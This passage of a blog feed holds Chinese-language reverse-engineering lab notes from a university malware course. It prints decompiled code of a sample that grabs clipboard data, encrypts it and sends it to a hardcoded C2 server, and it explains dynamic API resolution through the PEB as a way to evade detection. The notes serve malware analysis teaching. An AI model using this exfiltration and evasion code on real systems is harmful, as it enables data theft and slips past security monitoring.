 PUCHAR pbInput; // [rsp+28h] [rbp-10h] BYREF

 pbInput = 0i64;
 collect_data(&amp;amp;pbInput);
 exfiltrate(pbInput);
}
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>collect_data
&lt;pre tabindex="0">&lt;code class="language-cpp=" data-lang="cpp=">void __fastcall collect_data(char **pbInput)
{
 char *pbInput_1; // [rsp+28h] [rbp-10h] BYREF

 collect_get_clipboard_data(&amp;amp;pbInput_1);
 *pbInput = pbInput_1;
}
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>collect_get_clipboard_data
&lt;pre tabindex="0">&lt;code class="language-cpp=" data-lang="cpp=">void __fastcall collect_get_clipboard_data(LPVOID *pbInput)
{
 HANDLE ClipboardData; // rax
 void *v3; // rsi
 int LastError; // eax
 char Buffer[34]; // [rsp+26h] [rbp-22h] BYREF

 if ( OpenClipboard(0i64) )
 {
 ClipboardData = GetClipboardData(1u);
 v3 = ClipboardData;
 if ( ClipboardData )
 {
 *pbInput = GlobalLock(ClipboardData);
 GlobalUnlock(v3);
 }
 else
 {
 LastError = GetLastError();
 _itoa(LastError, Buffer, 10);
 }
 }
 CloseClipboard();
}
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ul>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>目前要分析的重點著重在DllMain中，所以其他的切入點可以先不管，並且先聚焦在collect data身上。其實作者一開始就有把debug information都放在這邊，所以分析可以更順暢&lt;/p></description></item><item><title>Simple Reverse - 0x23(2023 Lab - WinMalware - Exfiltrate)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x232023-lab---winmalware---exfiltrate/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x232023-lab---winmalware---exfiltrate/</guid><description>&lt;h1 id="simple-reverse---0x232023-lab---winmalware---exfiltrate">
 Simple Reverse - 0x23(2023 Lab - WinMalware - Exfiltrate)
 &lt;a class="anchor" href="#simple-reverse---0x232023-lab---winmalware---exfiltrate">#&lt;/a>
&lt;/h1>
&lt;h2 id="description">
 Description
 &lt;a class="anchor" href="#description">#&lt;/a>
&lt;/h2>
&lt;blockquote>
&lt;p>請根據 next stage payload 的行為，分析 capture.pcapng 中的封包，找出並解密被滲出/傳送到 C2 server 的資料。&lt;/p>&lt;/blockquote>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/winsock/nf-winsock-wsastartup">WSAStartup&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/winsock/nf-winsock-htons">htons&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/winsock2/nf-winsock2-socket">socket&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/winsock/sockaddr-2">sockaddr&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/winsock2/nf-winsock2-wsaconnect">WSAConnect&lt;/a>&lt;/li>
&lt;/ul>
&lt;h2 id="source-code">
 Source Code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>exfiltrate
:::spoiler source
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#66d9ef">__fastcall&lt;/span> &lt;span style="color:#a6e22e">exfiltrate&lt;/span>(PUCHAR pbInput)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">__int64&lt;/span> s[&lt;span style="color:#ae81ff">2&lt;/span>]; &lt;span style="color:#75715e">// [rsp+28h] [rbp-10h] BYREF
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> connect_to_c2(s);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> send_collected_data_to_c2(s[&lt;span style="color:#ae81ff">0&lt;/span>], pbInput);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> shutdown(s[&lt;span style="color:#ae81ff">0&lt;/span>], &lt;span style="color:#ae81ff">1&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> closesocket(s[&lt;span style="color:#ae81ff">0&lt;/span>]);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>:::&lt;/li>
&lt;li>connect_to_c2
:::spoiler source
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#66d9ef">__fastcall&lt;/span> &lt;span style="color:#a6e22e">connect_to_c2&lt;/span>(&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">__int64&lt;/span> &lt;span style="color:#f92672">*&lt;/span>a1)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">__int64&lt;/span> v2; &lt;span style="color:#75715e">// rax
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#a6e22e">sockaddr&lt;/span> name; &lt;span style="color:#75715e">// [rsp+20h] [rbp-1B8h] BYREF
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#a6e22e">WSAData&lt;/span> WSAData; &lt;span style="color:#75715e">// [rsp+30h] [rbp-1A8h] BYREF
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( &lt;span style="color:#f92672">!&lt;/span>WSAStartup(&lt;span style="color:#ae81ff">0x202u&lt;/span>, &lt;span style="color:#f92672">&amp;amp;&lt;/span>WSAData) )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&amp;amp;&lt;/span>name.sa_data[&lt;span style="color:#ae81ff">2&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">168470720&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>name.sa_data &lt;span style="color:#f92672">=&lt;/span> htons(&lt;span style="color:#ae81ff">0x2BB3u&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> name.sa_family &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v2 &lt;span style="color:#f92672">=&lt;/span> socket(&lt;span style="color:#ae81ff">2&lt;/span>, &lt;span style="color:#ae81ff">1&lt;/span>, &lt;span style="color:#ae81ff">6&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>a1 &lt;span style="color:#f92672">=&lt;/span> v2;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> connect(v2, &lt;span style="color:#f92672">&amp;amp;&lt;/span>name, &lt;span style="color:#ae81ff">16&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>:::&lt;/li>
&lt;li>send_collected_data_to_c2
:::spoiler source
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#66d9ef">__fastcall&lt;/span> &lt;span style="color:#a6e22e">send_collected_data_to_c2&lt;/span>(SOCKET s, PUCHAR pbInput)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>v4; &lt;span style="color:#75715e">// rbx
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> v5; &lt;span style="color:#75715e">// esi
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> i; &lt;span style="color:#75715e">// eax
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> v7; &lt;span style="color:#75715e">// al
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> j; &lt;span style="color:#75715e">// ecx
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> v9; &lt;span style="color:#75715e">// eax
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v4 &lt;span style="color:#f92672">=&lt;/span> malloc(&lt;span style="color:#ae81ff">0x4Cu&lt;/span>i64);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>v4 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x11877811&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>(v4 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>) &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>(v4 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>) &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( send(s, v4, &lt;span style="color:#ae81ff">76&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>) &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">0xB&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v5 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span> ( v5 &lt;span style="color:#f92672">&amp;lt;=&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( recv(s, v4, &lt;span style="color:#ae81ff">76&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>) &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">0xB&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#f92672">*&lt;/span>v4 &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0x11877811&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v9 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(v4 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( v9 )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">switch&lt;/span> ( v9 )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>v4 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x11877811&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>(v4 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>) &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>(v4 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>) &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> encrypt_key &lt;span style="color:#f92672">=&lt;/span> (v4 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">12&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> encrypt_data(pbInput);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> ( i &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>; i &lt;span style="color:#f92672">&amp;lt;=&lt;/span> &lt;span style="color:#ae81ff">23&lt;/span>; &lt;span style="color:#f92672">++&lt;/span>i )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v4[i &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">12&lt;/span>] &lt;span style="color:#f92672">+=&lt;/span> v4[i &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">11&lt;/span>] &lt;span style="color:#f92672">-&lt;/span> v4[i &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">10&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>v4 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x11877811&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>(v4 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>) &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">28&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>(v4 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>) &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> memcpy_s(v4 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">12&lt;/span>, &lt;span style="color:#ae81ff">0x18u&lt;/span>i64, cipher, &lt;span style="color:#ae81ff">0x18u&lt;/span>i64);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">goto&lt;/span> LABEL_20;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>v4 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x11877811&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>(v4 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>) &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>(v4 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>) &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> ( j &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; j &lt;span style="color:#f92672">&amp;lt;=&lt;/span> &lt;span style="color:#ae81ff">39&lt;/span>; &lt;span style="color:#f92672">++&lt;/span>j )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v7 &lt;span style="color:#f92672">=&lt;/span> v4[j &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">36&lt;/span>] &lt;span style="color:#f92672">+&lt;/span> v4[&lt;span style="color:#ae81ff">43&lt;/span>] &lt;span style="color:#f92672">+&lt;/span> v4[&lt;span style="color:#ae81ff">49&lt;/span>] &lt;span style="color:#f92672">-&lt;/span> v4[&lt;span style="color:#ae81ff">67&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v4[j &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">36&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> v7;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v4[j &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">36&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> v4[&lt;span style="color:#ae81ff">54&lt;/span>] &lt;span style="color:#f92672">-&lt;/span> (v4[&lt;span style="color:#ae81ff">61&lt;/span>] &lt;span style="color:#f92672">+&lt;/span> v4[&lt;span style="color:#ae81ff">69&lt;/span>]) &lt;span style="color:#f92672">+&lt;/span> v7;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> send(s, v4, &lt;span style="color:#ae81ff">76&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">++&lt;/span>v5;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LABEL_20:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> free(v4);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>:::&lt;/li>
&lt;/ul>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>&lt;code>connet_to_c2&lt;/code>
目標是取得c2 server的IP和port number&lt;/p></description></item><item><title>Simple Reverse - 0x24(2023 Lab - WinMalware - Dynamic API Resolution Background)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x242023-lab---winmalware---dynamic-api-resolution-background/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x242023-lab---winmalware---dynamic-api-resolution-background/</guid><description>&lt;h1 id="simple-reverse---0x242023-lab---winmalware---dynamic-api-resolution-background">
 Simple Reverse - 0x24(2023 Lab - WinMalware - Dynamic API Resolution Background)
 &lt;a class="anchor" href="#simple-reverse---0x242023-lab---winmalware---dynamic-api-resolution-background">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>Process Environment Block (PEB)
&lt;ul>
&lt;li>紀錄許多 Process 相關資訊的 OS 資料結構&lt;/li>
&lt;li>存在於 user land&lt;/li>
&lt;li>x86 環境下，可以從 fs:[0x30] 取得&lt;/li>
&lt;li>x64 環境下，可以從 gs:[0x60] 取得&lt;/li>
&lt;li>==0x18: Ldr==
&lt;ul>
&lt;li>指向 _PEB_LDR_DATA 結構&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;a href="https://www.vergiliusproject.com/kernels/x64/Windows%2011/22H2%20%282022%20Update%29/_PEB">_PEB&lt;/a> (注意 x64 和 x86 結構不同)
&lt;img src="https://hackmd.io/_uploads/HyIcW4CfT.png" alt="" />&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>_PEB_LDR_DATA
&lt;ul>
&lt;li>紀錄 Process 中載入模組的相關資訊
&lt;ul>
&lt;li>模組 module：PE 或 DLL&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>==0x10: InLoadOrderModuleList==
&lt;ul>
&lt;li>指向 _LDR_DATA_TABLE_ENTRY&lt;/li>
&lt;li>依載入順序串起的雙向 linked list&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;a href="https://www.vergiliusproject.com/kernels/x64/Windows%2011/22H2%20%282022%20Update%29/_PEB_LDR_DATA">_PEB_LDR_DATA&lt;/a>
&lt;img src="https://hackmd.io/_uploads/BJFj-NAGp.png" alt="" />&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>_LDR_DATA_TABLE_ENTRY
&lt;ul>
&lt;li>紀錄一個載入模組的相關資訊&lt;/li>
&lt;li>==0x00: InLoadOrderModuleList==
&lt;ul>
&lt;li>依載入順序串起的雙向 linked list&lt;/li>
&lt;li>Flink：指向下一個 entry&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>==0x30: DllBase==
&lt;ul>
&lt;li>此載入模組的 ImageBase&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>==0x58: BaseDllName==
&lt;ul>
&lt;li>此載入模組的檔案名稱&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>_LDR_DATA_TABLE_ENTRY
&lt;img src="https://hackmd.io/_uploads/BJ5JfVAMp.png" alt="" />&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h2 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>Defense Evasion — Dynamic API Resolution
&lt;ul>
&lt;li>用途:
&lt;blockquote>
&lt;p>駭客常用的手法往往倚賴特定的 API 來達成，例如：&lt;code>Injection&lt;/code> = &lt;code>VirtualAllocEx&lt;/code> + &lt;code>WriteProcessMemory&lt;/code> + &lt;code>CreateRemoteThread&lt;/code>，因此資安產品只要監控這些 API，就很容易偵測到惡意行為
Shellcode 沒有 loader 幫你把 API 連結起來&lt;/p></description></item><item><title>Simple Reverse - 0x25(2023 Lab - WinMalware - 作業)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x252023-lab---winmalware---%E4%BD%9C%E6%A5%AD/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x252023-lab---winmalware---%E4%BD%9C%E6%A5%AD/</guid><description>&lt;h1 id="simple-reverse---0x252023-lab---winmalware---作業">
 Simple Reverse - 0x25(2023 Lab - WinMalware - 作業)
 &lt;a class="anchor" href="#simple-reverse---0x252023-lab---winmalware---%e4%bd%9c%e6%a5%ad">#&lt;/a>
&lt;/h1>
&lt;h2 id="description">
 Description
 &lt;a class="anchor" href="#description">#&lt;/a>
&lt;/h2>
&lt;blockquote>
&lt;p>在 next stage payload 的 my_start 導出函數中，惡意程式透過 dynamic API resolution 手法取得了一些 APIs。請問其從 user32.dll 取得的 API 的名稱為何？
&lt;a href="https://github.com/Mr-Un1k0d3r/WindowsDllsExport/blob/main/Win11-22000/user32.dll.txt">A list of all exported functions of user32.dll&lt;/a>&lt;/p>
&lt;p>Flag format: FLAG{WindowsAPIname}&lt;/p>&lt;/blockquote>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://hackmd.io/@SBK6401/Bkd51XRM6">Dynamic API Resolution Background&lt;/a>&lt;/p>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>根據前一個筆記，我們已經知道他怎麼找API，只是我們還不知道他用的到底是哪一個API，因為他有事先用過hash，題目也是要我們找到這一個部分，最簡單的做法是把user32.dll的所有API都用作者自定義的hash function做一遍，直到找到他要的那一個，目前問題最大的應該是不知道&lt;code>__ROL4__&lt;/code>的意思，根據&lt;a href="https://www.felixcloutier.com/x86/rcl:rcr:rol:ror">x86 and amd64 instruction reference&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>The rotate left (ROL) and rotate through carry left (RCL) instructions shift all the bits toward more-significant bit positions, except for the most-significant bit, which is rotated to the least-significant bit location. The rotate right (ROR) and rotate through carry right (RCR) instructions shift all the bits toward less significant bit positions, except for the least-significant bit, which is rotated to the most-significant bit location.&lt;/p></description></item><item><title>Simple Reverse - 0x26(2023 HW - Banana Donut Verifier)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/simple-reverse---0x262023-hw---banana-donut-verifier/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/simple-reverse---0x262023-hw---banana-donut-verifier/</guid><description>&lt;h1 id="simple-reverse---0x262023-hw---banana-donut-verifier">
 Simple Reverse - 0x26(2023 HW - Banana Donut Verifier)
 &lt;a class="anchor" href="#simple-reverse---0x262023-hw---banana-donut-verifier">#&lt;/a>
&lt;/h1>
&lt;h2 id="source-code">
 Source Code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Source Code&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>__int64 __fastcall main(int a1, char &lt;span style="color:#f92672">**&lt;/span>a2, char &lt;span style="color:#f92672">**&lt;/span>a3)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">//&lt;/span> [COLLAPSED LOCAL DECLARATIONS&lt;span style="color:#f92672">.&lt;/span> PRESS KEYPAD CTRL&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#e6db74">&amp;#34;+&amp;#34;&lt;/span> TO EXPAND]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
